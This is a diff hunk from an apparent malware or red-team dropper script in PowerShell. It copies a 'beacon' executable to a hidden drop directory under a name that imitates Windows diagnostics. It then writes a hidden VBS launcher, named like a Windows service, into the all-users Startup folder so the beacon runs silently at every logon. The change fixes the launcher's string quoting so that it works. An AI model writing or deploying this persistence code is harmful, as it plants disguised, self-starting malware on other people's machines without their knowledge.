@@ -194,7 +194,7 @@ $p4 = Copy-Hidden $BeaconPath (Join-Path (Get-DropDir) "${pfx}windiag-vbs-host.e
 if ($p4) {
     try {
         $vbs  = Join-Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" "${pfx}windiag_svc.vbs"
-        $vbsContent = "Set oShell = CreateObject(""WScript.Shell"") : oShell.Run """"""" & $p4 & """"""" & "", 0, False"
+        $vbsContent = 'Set oShell = CreateObject("WScript.Shell") : oShell.Run """' + $p4 + '""", 0, False'
         [System.IO.File]::WriteAllText($vbs, $vbsContent, [System.Text.Encoding]::ASCII)
         $item = Get-Item $vbs -Force
         $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden
